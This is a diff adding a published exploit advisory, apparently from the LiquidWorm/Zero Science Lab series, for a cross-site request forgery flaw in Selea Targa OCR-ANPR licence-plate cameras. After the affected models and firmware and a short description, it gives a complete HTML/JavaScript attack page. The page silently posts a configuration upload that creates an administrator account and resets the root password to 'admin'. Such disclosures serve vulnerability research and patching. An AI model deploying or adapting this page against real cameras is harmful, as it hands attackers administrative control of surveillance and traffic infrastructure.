@@ -1,0 +1,117 @@
+# Exploit Title: Selea Targa IP OCR-ANPR Camera - CSRF Add Admin
+# Date: 07.11.2020
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.selea.com
+
+Selea Targa IP OCR-ANPR Camera CSRF Add Admin Exploit
+
+
+Vendor: Selea s.r.l.
+Product web page: https://www.selea.com
+Affected version: Model: iZero
+                         Targa 512
+                         Targa 504
+                         Targa Semplice
+                         Targa 704 TKM
+                         Targa 805
+                         Targa 710 INOX
+                         Targa 750
+                         Targa 704 ILB
+                  Firmware: BLD201113005214
+                            BLD201106163745
+                            BLD200304170901
+                            BLD200304170514
+                            BLD200303143345
+                            BLD191118145435
+                            BLD191021180140
+                            BLD191021180140
+                  CPS: 4.013(201105)
+                       3.100(200225)
+                       3.005(191206)
+                       3.005(191112)
+
+Summary: IP camera with optical character recognition (OCR) software for automatic
+number plate recognition (ANPR) also equipped with ADR system that enables it to read
+the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
+of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
+plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
+this camera suitable for all installation conditions. Its built-in OCR software works
+as an automatic and independent system without the need of a computer, thus giving
+autonomy to the device even in the event of an interruption in the connection between
+the camera and the operations centre.
+
+Desc: The application interface allows users to perform certain actions via HTTP requests
+without performing any validity checks to verify the requests. This can be exploited to
+perform certain actions with administrative privileges if a logged-in user visits a malicious
+web site.
+
+Tested on: GNU/Linux 3.10.53 (armv7l)
+           PHP/5.6.22
+           selea_httpd
+           HttpServer/0.1
+           SeleaCPSHttpServer/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2021-5618
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5618.php
+
+
+07.11.2020
+
+--
+
+
+Add Admin:
+----------
+
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/192.168.1.17\/save_params.php", true);
+        xhr.setRequestHeader("Accept", "*\/*");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=cfgboundary-----------------------1607475234133");
+        xhr.withCredentials = true;
+        var body = "--cfgboundary-----------------------1607475234133\r\n" + 
+          "Content-Disposition: form-data; name=\"set_params\"\r\n" + 
+          "\r\n" + 
+          "upload\r\n" + 
+          "--cfgboundary-----------------------1607475234133\r\n" + 
+          "Content-Disposition: form-data; name=\"user_file\"; filename=\"set_params.dat\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "[SECURITY.USERS]\r\n" + 
+          "security-users-0-username = testingus\r\n" + 
+          "security-users-0-password = testingus\r\n" + 
+          "security-users-0-rights = 2\r\n" + 
+          "security-users-1-username = \r\n" + 
+          "security-users-1-password = \r\n" + 
+          "security-users-1-rights = 0\r\n" + 
+          "security-users-2-username = \r\n" + 
+          "security-users-2-password = \r\n" + 
+          "security-users-2-rights = 0\r\n" + 
+          "security-users-3-username = \r\n" + 
+          "security-users-3-password = \r\n" + 
+          "security-users-3-rights = 0\r\n" + 
+          "security-allow_viewers_storage_access = 1\r\n" + 
+          "CFG_ROOTPASS = admin\r\n" + 
+          "\r\n" + 
+          "--cfgboundary-----------------------1607475234133--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Add Admin" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
